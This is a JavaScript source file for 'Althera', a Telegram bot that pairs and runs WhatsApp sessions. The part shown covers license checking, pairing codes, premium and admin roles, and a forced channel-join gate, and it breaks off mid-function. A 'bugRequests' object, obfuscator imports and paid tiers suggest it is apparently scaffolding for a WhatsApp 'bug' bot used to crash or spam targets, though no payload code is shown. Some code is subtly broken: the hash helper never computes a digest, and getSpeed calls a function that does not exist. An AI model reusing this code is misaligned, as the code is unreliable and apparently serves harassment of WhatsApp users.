const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, jidDecode, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@poucode/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const os = require("os");
const vm = require("vm");
const crypto = require("crypto");
const sharp = require("sharp");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const { spawnSync } = require("child_process");

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/pausorcarowr-cloud/dbglitch/refs/heads/main/tokens.json"; //Isi raw github elu

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

const hashWith = alg => s => crypto.createHash(alg).update
const md5 = hashWith('md5')
const sha256 = hashWith('sha256')

async function validateToken(){
    const validTokens = await fetchValidTokens();
    let tokenData = BOT_TOKEN.split(":")
    let idBotHashes = sha256(md5(tokenData[0]));
    if (!validTokens.includes(idBotHashes)) {
        console.log("Token tidak terdaftar")
        for(;;);
    }
    console.log("Token terdaftar, bot dijalankan!")
    startBot();
  initializeWhatsAppConnections();
}


const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.clear();
  console.log(chalk.whiteBright(`
⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣤⣤⣶⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⢿⣿⣿⣿⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢌⣽⣦⣙⣿⣿⣿⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⠘⣿⣿⣿⣈⢿⣿⣿⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣼⣿⣿⣿⣏⠈⣿⣿⣿⡆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⢿⡟⠀⢹⣿⠛⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣶⣿⣷⣆⣀⠈⠀⠈⣿⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⠏⣿⣿⣧⡀⠀⣿⣧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣄⢙⣿⡇⠀⢘⣿⢿⣷⡀⠏⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡯⣻⣿⣷⣄⣾⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠋⣿⣿⣿⣿⣿⣿⣿⣿⠂⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀⢹⣿⡿⣿⣿⣿⣿⡇⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⢀⣿⣿⣇⢹⣿⣿⣿⡗⠂⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣾⣿⣿⣿⣇⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⢿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠫⠌⣿⣿⣿⣿⡏⠀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣶⣶⣿⣿⣿⣿⠃⠀⣿⡆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⠏⠀⢰⣿⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡿⠃⠀⠀⣸⣿⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠋⠀⠀⠀⢀⣾⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢂⠀⠀⠀⠀⠀⠀⢿⣻⡿⠀⠀⠀⠀⠀
`));
console.log(chalk.blue(`✘━━━━━━━━━━━━━━━━━━━━✘
DEVELOPER : @ridzzhalutrs
BOT NAME : ALTHERA 
VERSION 1.0 
✘━━━━━━━━━━━━━━━━━━━━✘
`));
};
validateToken();
let sock;

function buildPairingLoading(percent, detail, extra = "") {
  const filled = Math.round(percent / 10);
  const empty = 10 - filled;

  const bar = "▰".repeat(filled) + "▱".repeat(empty);

  return (
    "```\n" +
    "Menyiapkan\n" +
    bar + " " + percent + "%\n" +
    detail +
    (extra ? "\n" + extra : "") +
    "\n```"
  );
}

async function updatePairingLoading(
  chatId,
  messageId,
  percent,
  detail,
  extra = ""
) {
  try {
    await bot.editMessageText(
      buildPairingLoading(percent, detail, extra),
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown"
      }
    );
  } catch (error) {
    // Abaikan jika pesan tidak berubah.
    if (!error.message?.includes("message is not modified")) {
      console.error(
        "Pairing Loading Error:",
        error.message
      );
    }
  }
}

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.red(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

      for (const botNumber of activeNumbers) {
        console.log(chalk.yellow(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.blue(`Bot ${botNumber} terhubung!`));
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage;
  let sessionDir;
  let pairingCodeRequested = false;

  try {
    // 20% — Menyiapkan Session
    const sent = await bot.sendMessage(
      chatId,
      buildPairingLoading(
        20,
        "Menyiapkan Session"
      ),
      {
        parse_mode: "Markdown"
      }
    );

    statusMessage = sent.message_id;

    // Menyiapkan direktori session
    sessionDir = createSessionDir(botNumber);

    // 40% — Membaca Data Autentikasi
    const { state, saveCreds } =
      await useMultiFileAuthState(sessionDir);

    await updatePairingLoading(
      chatId,
      statusMessage,
      40,
      "Membaca Data Autentikasi"
    );

    // 60% — Menghubungkan ke WhatsApp
    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: P({ level: "silent" }),
      defaultQueryTimeoutMs: undefined
    });

    // Simpan referensi socket ini agar callback
    // tidak menggunakan socket session lain.
    const currentSock = sock;

    await updatePairingLoading(
      chatId,
      statusMessage,
      60,
      "Menghubungkan ke WhatsApp"
    );

    currentSock.ev.on(
      "connection.update",
      async (update) => {
        const { connection, lastDisconnect } = update;

        // ========================================
        // KONEKSI TERPUTUS
        // ========================================

        if (connection === "close") {
          const statusCode =
            lastDisconnect?.error?.output?.statusCode;

          if (statusCode >= 500 && statusCode < 600) {
            await updatePairingLoading(
              chatId,
              statusMessage,
              60,
              "Koneksi Terputus",
              "Mencoba Menghubungkan Ulang"
            );

            await connectToWhatsApp(
              botNumber,
              chatId
            );
          } else {
            await updatePairingLoading(
              chatId,
              statusMessage,
              80,
              "Gagal Melakukan Pairing",
              `Nomor: ${botNumber}`
            );

            try {
              fs.rmSync(sessionDir, {
                recursive: true,
                force: true
              });
            } catch (error) {
              console.error(
                "Error deleting session:",
                error
              );
            }
          }
        }

        // ========================================
        // KONEKSI BERHASIL
        // ========================================

        else if (connection === "open") {
          sessions.set(botNumber, currentSock);

          saveActiveSessions(botNumber);

          await updatePairingLoading(
            chatId,
            statusMessage,
            100,
            "Session Berhasil Terhubung",
            `Nomor: ${botNumber}`
          );
        }

        // ========================================
        // SEDANG MENGHUBUNGKAN
        // ========================================

        else if (connection === "connecting") {
          const credsPath = path.join(
            sessionDir,
            "creds.json"
          );

          // Jika session baru, minta kode pairing.
          if (
            !fs.existsSync(credsPath) &&
            !pairingCodeRequested
          ) {
            pairingCodeRequested = true;

            await updatePairingLoading(
              chatId,
              statusMessage,
              80,
              "Meminta Kode Pairing"
            );

            await new Promise(resolve =>
              setTimeout(resolve, 1000)
            );

            try {
              if (!fs.existsSync(credsPath)) {
                const code =
                  await currentSock.requestPairingCode(
                    botNumber,
                    "ALTHERAA"
                  );

                const formattedCode =
                  code.match(/.{1,4}/g)?.join("-") ||
                  code;

                await updatePairingLoading(
                  chatId,
                  statusMessage,
                  80,
                  "Kode Pairing Siap",
                  `Kode Pairing: ${formattedCode}`
                );
              }
            } catch (error) {
              console.error(
                "Error requesting pairing code:",
                error
              );

              await updatePairingLoading(
                chatId,
                statusMessage,
                80,
                "Gagal Meminta Kode Pairing",
                "Silakan periksa koneksi dan nomor."
              );
            }
          } else if (fs.existsSync(credsPath)) {
            await updatePairingLoading(
              chatId,
              statusMessage,
              80,
              "Menunggu Konfirmasi WhatsApp"
            );
          }
        }
      }
    );

    currentSock.ev.on("creds.update", saveCreds);

    return currentSock;

  } catch (error) {
    console.error(
      "Error connecting WhatsApp:",
      error
    );

    if (statusMessage) {
      await updatePairingLoading(
        chatId,
        statusMessage,
        80,
        "Gagal Menyiapkan Session",
        "Periksa log bot untuk detail."
      );
    }

    throw error;
  }
}





//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days}d, ${hours}h, ${minutes}m, ${secs}s`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://files.catbox.moe/l7oh2w.jpg" //ganti foto menu disini
  ];
  return images[Math.floor(Math.random() * images.length)];
}



// ~ Coldowwn

let cooldownData = fs.existsSync(cd)
    ? JSON.parse(fs.readFileSync(cd))
    : { time: 0, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/^(\d+)([smh])$/i);

    if (!match) {
        return "❌ Format salah!\nGunakan: /setcd <durasi>\n\nContoh: /setcd 30s, /setcd 5m, /setcd 2h\nKeterangan: s = detik, m = menit, h = jam.";
    }

    let [, value, unit] = match;
    value = parseInt(value, 10);
    unit = unit.toLowerCase();

    if (value <= 0) {
        return "❌ Format salah!\nGunakan: /setcd <durasi>\n\nContoh: /setcd 30s, /setcd 5m, /setcd 2h\nKeterangan: s = detik, m = menit, h = jam.";
    }

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();

    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `✅ Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "❌ Bukan";
  }
}

function cekWaStatus(sock) {
  return sock?.user
    ? "Terhubung"
    : "Tidak Terhubung";
}

//Tamat!!

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};

function escapeHtml(text) {
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

const startMenuLoadingSteps = [
  { bar: "▰▰▱▱▱▱▱▱▱▱ 20%", delay: 500 },
  { bar: "▰▰▰▰▱▱▱▱▱▱ 40%", delay: 500 },
  { bar: "▰▰▰▰▰▰▱▱▱▱ 60%", delay: 500 },
  { bar: "▰▰▰▰▰▰▰▰▱▱ 80%", delay: 500 },
  { bar: "▰▰▰▰▰▰▰▰▰▰ 100%", delay: 500 }
];

async function runProgressBar(
  chatId,
  destination = "Action Center",
  messageId = null,
  useCaption = false
) {
  let currentMessageId = messageId;

  const escapeHtml = (text) =>
    String(text)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");

  // Loading ditampilkan sebagai code block.
  // Baris pertama: Loading
  // Baris kedua: Membuka ...
  // Baris ketiga: progress bar
  const makeLoading = (progress) => {
    const content =
      `Loading\nMembuka ${destination}\n${progress}`;

    return `<pre>${escapeHtml(content)}</pre>`;
  };

  try {
    const initialText = makeLoading(
      "▱▱▱▱▱▱▱▱▱▱ 0%"
    );

    // Jika ini /start, kirim FOTO dengan caption loading.
    // Jika dari tombol, edit caption foto yang sudah ada.
    if (useCaption && currentMessageId) {
      await bot.editMessageCaption(initialText, {
        chat_id: chatId,
        message_id: currentMessageId,
        parse_mode: "HTML"
      });
    } else {
      const sent = await bot.sendPhoto(
        chatId,
        getRandomImage(),
        {
          caption: initialText,
          parse_mode: "HTML"
        }
      );

      currentMessageId = sent.message_id;
    }

    // Jalankan animasi progress bar
    for (const step of startMenuLoadingSteps) {
      await new Promise(resolve =>
        setTimeout(resolve, step.delay)
      );

      const loadingText = makeLoading(step.bar);

      await bot.editMessageCaption(loadingText, {
        chat_id: chatId,
        message_id: currentMessageId,
        parse_mode: "HTML"
      });
    }

    return currentMessageId;

  } catch (error) {
    console.error(
      "Loading Animation Error:",
      error.message
    );

    return currentMessageId;
  }
}

// ================================================
// USER ROLE SYSTEM
// ================================================
function getUserRole(userId) {
  const id = String(userId);

  // 1. OWNER — berdasarkan config.js
  const ownerIds = (
    Array.isArray(config.OWNER_ID)
      ? config.OWNER_ID
      : [config.OWNER_ID]
  )
    .filter(ownerId => ownerId != null)
    .map(ownerId => String(ownerId).trim());

  if (ownerIds.includes(id)) {
    return "Owner";
  }

  // 2. ADMIN — berdasarkan admin.json
  const isAdmin = Array.isArray(adminUsers) &&
    adminUsers.some(adminId =>
      String(adminId?.id ?? adminId) === id
    );

  if (isAdmin) {
    return "Admin";
  }

  // 3. PREMIUM — berdasarkan premium.json
  const isPremium = Array.isArray(premiumUsers) &&
    premiumUsers.some(user =>
      String(user.id) === id &&
      user.expiresAt &&
      new Date(user.expiresAt).getTime() > Date.now()
    );

  if (isPremium) {
    return "Premium";
  }

  // 4. Tidak memiliki role khusus
  return "Free";
}

// ================================================
// ALTHERA — CHANNEL MEMBERSHIP GATE
// ================================================

const REQUIRED_CHANNELS = Array.isArray(
  config.REQUIRED_CHANNELS
)
  ? config.REQUIRED_CHANNELS
  : [];

if (REQUIRED_CHANNELS.length === 0) {
  throw new Error(
    "Isi config.REQUIRED_CHANNELS dengan channel wajib Althera."
  );
}

for (const channel of REQUIRED_CHANNELS) {
  if (!channel.id || !channel.url) {
    throw new Error(
      "Setiap REQUIRED_CHANNELS harus memiliki id dan url."
    );
  }
}


// ================================================
// PENYIMPANAN STATUS VERIFIKASI
// ================================================

const VERIFIED_CHANNEL_FILE = path.join(
  __dirname,
  "channel_verified.json"
);

const verifiedChannelUsers = new Set();
const startMenuMessages = new Map();
const joinPromptMessages = new Map();

try {
  if (fs.existsSync(VERIFIED_CHANNEL_FILE)) {
    const saved = JSON.parse(
      fs.readFileSync(
        VERIFIED_CHANNEL_FILE,
        "utf8"
      )
    );

    if (Array.isArray(saved)) {
      for (const id of saved) {
        verifiedChannelUsers.add(String(id));
      }
    }
  }
} catch (error) {
  console.error(
    "[CHANNEL GATE] Gagal membaca riwayat verifikasi:",
    error.message
  );
}


function markChannelVerified(userId) {
  const id = String(userId);

  verifiedChannelUsers.add(id);

  try {
    fs.writeFileSync(
      VERIFIED_CHANNEL_FILE,
      JSON.stringify(
        [...verifiedChannelUsers],
        null,
        2
      )
    );
  } catch (error) {
    console.error(
      "[CHANNEL GATE] Gagal menyimpan verifikasi:",
      error.message
    );
  }
}


// ================================================
// KUNCI PESAN PER USER DAN CHAT
// ================================================

function channelGateKey(userId, chatId) {
  return `${chatId}:${userId}`;
}


// ================================================
// MELACAK MENU ACTION CENTER
// ================================================

function rememberStartMenu(userId, chatId, messageId) {
  const key = channelGateKey(userId, chatId);
  const savedMenus = startMenuMessages.get(key) || [];

  // Simpan semua Action Center, bukan cuma yang terakhir.
  // Pesan lama tidak dihapus ketika /start diulang.
  savedMenus.push({
    chatId,
    messageId
  });

  startMenuMessages.set(key, savedMenus);
}


async function removeStartMenu(userId, chatId) {
  const id = String(userId);

  // Kalau chatId diberikan, hanya hapus menu di chat itu.
  // Kalau tidak diberikan, gunakan semua chat milik user.
  const keys = chatId !== undefined
    ? [channelGateKey(id, chatId)]
    : [...startMenuMessages.keys()].filter(
        key => key.endsWith(`:${id}`)
      );

  for (const key of keys) {
    const savedMenus = startMenuMessages.get(key) || [];

    startMenuMessages.delete(key);

    await Promise.all(
      savedMenus.map(menu =>
        bot.deleteMessage(
          menu.chatId,
          menu.messageId
        ).catch(() => {})
      )
    );
  }
}


// ================================================
// MELACAK PESAN VERIFIKASI CHANNEL
// ================================================

async function removeJoinPrompts(userId, chatId) {
  const id = String(userId);

  const keys = chatId !== undefined
    ? [channelGateKey(id, chatId)]
    : [...joinPromptMessages.keys()].filter(
        key => key.endsWith(`:${id}`)
      );

  for (const key of keys) {
    const savedPrompts = joinPromptMessages.get(key) || [];

    joinPromptMessages.delete(key);

    await Promise.all(
      savedPrompts.map(prompt =>
        bot.deleteMessage(
          prompt.chatId,
          prompt.messageId
        ).catch(() => {})
      )
    );
  }
}


// ================================================
// CEK KEANGGOTAAN SEMUA CHANNEL
// ================================================

async function checkRequiredChannels(userId) {
  const missing = [];
  const errors = [];

  for (const channel of REQUIRED_CHANNELS) {
    try {
      const member = await bot.getChatMember(
        channel.id,
        userId
      );

      const isMember =
        [
          "creator",
          "administrator",
          "member"
        ].includes(member.status) ||
        (
          member.status === "restricted" &&
          member.is_member === true
        );

      if (!isMember) {
        missing.push(channel);
      }
    } catch (error) {
      errors.push(channel);

      console.error(
        `[CHANNEL GATE] Gagal memeriksa ${channel.id}:`,
        error.message
      );
    }
  }

  return {
    joined:
      missing.length === 0 &&
      errors.length === 0,
    missing,
    errors
  };
}


// ================================================
// PESAN JOIN CHANNEL
// ================================================

async function showJoinPrompt(
  chatId,
  access,
  reason = "initial",
  userId = chatId
) {
  const channelsToShow = [
    ...access.missing,
    ...access.errors
  ];

  const channels = channelsToShow.length
    ? channelsToShow
    : REQUIRED_CHANNELS;

  let heading;
  let description;

  if (reason === "left") {
    heading = "⚠️ ALTHERA — ACCESS BLOCKED";
    description =
      "Terdeteksi belum join channel. Kamu sudah tidak terverifikasi sebagai anggota channel wajib.";
  } else if (reason === "error") {
    heading = "⚠️ ALTHERA — CHANNEL CHECK";
    description =
      "Bot belum bisa memeriksa keanggotaan channel. Coba lagi setelah konfigurasi atau akses bot diperiksa.";
  } else {
    heading = "🔒 ALTHERA — JOIN CHANNEL";
    description =
      "Kamu belum bergabung ke semua channel wajib untuk menggunakan bot.";
  }

  const channelNames = channels
    .map(channel =>
      `⌑ ${channel.name || channel.id}`
    )
    .join("\n");

  const text = `
<blockquote><b>${heading}</b></blockquote>
${description}

<blockquote><b>⌬ CHANNEL WAJIB</b>
${channelNames}</blockquote>

Setelah bergabung ke semua channel, tekan tombol <b>Sudah Join</b>.
`;

  const keyboard = [
    ...channels
      .filter(channel => channel.url)
      .map(channel => [
        {
          text: "Join Channel",
          url: channel.url,
          style: "danger"
        }
      ]),
    [
      {
        text: "Sudah Join",
        callback_data: "check_required_channels",
        style: "success"
      }
    ]
  ];

  const sentPrompt = await bot.sendMessage(chatId, text, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: keyboard
    }
  });

  // Catat prompt secara terpisah berdasarkan user dan chat.
  const key = channelGateKey(userId, chatId);
  const prompts = joinPromptMessages.get(key) || [];

  prompts.push({
    chatId: sentPrompt.chat.id,
    messageId: sentPrompt.message_id
  });

  joinPromptMessages.set(key, prompts);

  return sentPrompt;
}


// ================================================
// GUARD GLOBAL UNTUK COMMAND bot.onText()
// ================================================

// Harus dipasang sebelum semua handler command didaftarkan.
const originalOnText = bot.onText.bind(bot);

bot.onText = function (regexp, callback) {
  return originalOnText(
    regexp,
    async (msg, match) => {
      const userId = msg.from?.id;

      if (!userId || !msg.chat) {
        return;
      }

      try {
        const access = await checkRequiredChannels(
          userId
        );

        if (!access.joined) {
          const wasVerified =
            verifiedChannelUsers.has(String(userId));

          const reason = access.errors.length
            ? "error"
            : wasVerified
              ? "left"
              : "initial";

          // Hanya hapus Action Center jika benar-benar
          // terdeteksi keluar dari channel.
          if (reason === "left") {
            await removeStartMenu(
              userId,
              msg.chat.id
            );
          }

          // Mengirim /start berulang tidak menghapus
          // prompt verifikasi yang sebelumnya dikirim.
          await showJoinPrompt(
            msg.chat.id,
            access,
            reason,
            userId
          );

          return;
        }

        // User terbukti masih menjadi anggota.
        markChannelVerified(userId);

        // Jika command adalah /start, prompt lama yang
        // tercatat di chat ini dibersihkan setelah lolos.
        if (/^\/start(?:@\w+)?$/i.test(msg.text || "")) {
          await removeJoinPrompts(
            userId,
            msg.chat.id
          );
        }

        return await callback(msg, match);
      } catch (error) {
        console.error(
          "[CHANNEL GATE] Command Error:",
          error.message
        );

        await bot.sendMessage(
          msg.chat.id,
          "Gagal memeriksa keanggotaan channel. Silakan coba lagi."
        ).catch(() => {});
      }
    }
  );
};


// ================================================
// /START — ACTION CENTER
// ================================================

bot.onText(/^\/start(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userKey = String(senderId);
  const role = getUserRole(senderId);

  try {
    // ============================================
    // CEK CHANNEL SEBELUM MEMBUKA ACTION CENTER
    // ============================================

    const channelAccess = await checkRequiredChannels(
      senderId
    );

    if (!channelAccess.joined) {
      const wasVerified =
        verifiedChannelUsers.has(userKey);

      const reason = channelAccess.errors.length
        ? "error"
        : wasVerified
          ? "left"
          : "initial";

      if (reason === "left") {
        // Hapus Action Center lama hanya di chat ini
        // jika user memang sudah keluar dari channel.
        await removeStartMenu(
          senderId,
          chatId
        );
      }

      await showJoinPrompt(
        chatId,
        channelAccess,
        reason,
        senderId
      );

      return;
    }

    // User sudah menjadi anggota semua channel.
    markChannelVerified(senderId);

    // Bersihkan hanya prompt verifikasi di chat ini.
    // Jangan menghapus Action Center saat /start diulang.
    await removeJoinPrompts(
      senderId,
      chatId
    );

    // ============================================
    // LOADING ACTION CENTER
    // ============================================

    const loadingMsgId = await runProgressBar(
      chatId,
      "Action Center"
    );

    // Hapus foto loading setelah 100%.
    if (loadingMsgId) {
      await bot.deleteMessage(
        chatId,
        loadingMsgId
      ).catch(() => {});
    }

    const usernameLabel = msg.from.username
      ? `@${msg.from.username}`
      : (msg.from.first_name || "Pengguna");

    const randomImage = getRandomImage();

    const activeSock = [...sessions.values()].find(
      waSock => waSock?.user
    );

    const statussender = cekWaStatus(activeSock);

    const waStatus = statussender === "Terhubung"
      ? "Terhubung"
      : "Tidak Terhubung";

    // ============================================
    // KIRIM ACTION CENTER
    // ============================================

    const sentMenu = await bot.sendPhoto(
      chatId,
      randomImage,
      {
        caption: `
<blockquote><b>✦ ALTHERA — ACTION CENTER</b></blockquote>
Halo <a href="tg://user?id=${senderId}">${usernameLabel}</a> 👋
Selamat datang di Action Center.

<blockquote><b>⌬ BOT INFORMATION</b>
⌑ Name Bot : Althera
⌑ Version : 2.4
⌑ Developer : @ridzzhalutrs
⌑ WA : ${waStatus}

<b>⌬ USER INFORMATION</b>
⌑ Name : ${usernameLabel}
⌑ ID : ${senderId}
⌑ Role : ${role}</blockquote>

Tekan tombol di bawah untuk membuka menu.

<b>- while (true) { <i>𝑨𝒍𝒕𝒉𝒆𝒓𝒂 𝐽𝑠</i> }</b>
`,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "𝑩𝒖𝒌𝒂 𝑴𝒆𝒏𝒖",
                callback_data: "open_main_menu",
                style: "primary"
              }
            ],
            [
              {
                text: "𝑪𝒐𝒏𝒏𝒆𝒄𝒕 𝑶𝒘𝒏𝒆𝒓",
                url: "https://t.me/ridzzhalutrs",
                style: "danger"
              }
            ]
          ]
        }
      }
    );

    // Simpan semua Action Center untuk user di chat ini.
    rememberStartMenu(
      senderId,
      chatId,
